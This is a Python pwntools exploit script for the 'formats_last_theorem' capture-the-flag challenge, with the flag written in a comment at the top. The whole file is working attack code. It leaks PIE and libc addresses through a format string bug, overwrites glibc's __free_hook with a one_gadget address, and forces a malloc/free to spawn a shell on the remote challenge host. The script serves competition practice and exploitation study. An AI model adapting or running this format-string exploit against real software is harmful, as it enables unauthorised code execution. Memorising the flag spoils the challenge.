#flag = dctf{N0t_all_7h30r3ms_s0und_g00d}
from pwnlib.fmtstr import  fmtstr_payload
from pwn import *

elf = ELF("./formats_last_theorem")
libc = elf.libc 		#Ubuntu 18.04  <---->   Glibc 2.27
context.clear(arch = 'amd64')

target = process([elf.path])
target = remote("dctf-chall-formats-last-theorem.westeurope.azurecontainer.io", 7482)

def s(d):
	target.sendline(d)

def p(a, d):
	payload = pwnlib.fmtstr.fmtstr_payload(6, {a: d}, 0, 'short')
	s(payload)

s("PIE%15$lxLIBC%2$lx")

target.recvuntil("PIE")
pie_base = int(target.recvuntil("LIBC", drop=True), 0x10) - 0x81d
log.info("PIE Base: " + hex(pie_base))
libc_base = int(target.recvline().strip(), 0x10) - (0x00007f27811ec8c0 - 0x00007f2780dff000)
log.info("LIBC Base: " + hex(libc_base))

gadgets = [324565, 324658, 939543, 939550, 939554, 1090588, 1090600]
p(libc_base + libc.sym['__free_hook'], libc_base + gadgets[2])

s("%90000c")		#To trigger free()/malloc() beacuse buffer size needed by printf is bigger than already alloted to it.

target.interactive()